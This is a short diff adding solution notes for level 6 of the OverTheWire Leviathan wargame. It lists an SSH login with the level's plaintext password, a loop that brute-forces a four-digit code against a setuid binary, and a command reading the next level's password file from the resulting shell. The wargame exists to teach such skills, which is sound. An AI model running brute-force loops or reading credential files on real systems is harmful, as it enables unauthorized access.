@@ -1,0 +1,8 @@
+ssh leviathan6@leviathan.labs.overthewire.org
+UgaoFee4li
+ll
+./leviathan6
+// You can see usage: ./leviathan6 <4 digit code>
+for i in {0000..9999}; do ./leviathan6 $i; echo $i; done
+// Now you get a shell.
+cat /etc/leviathan_pass/leviathan7
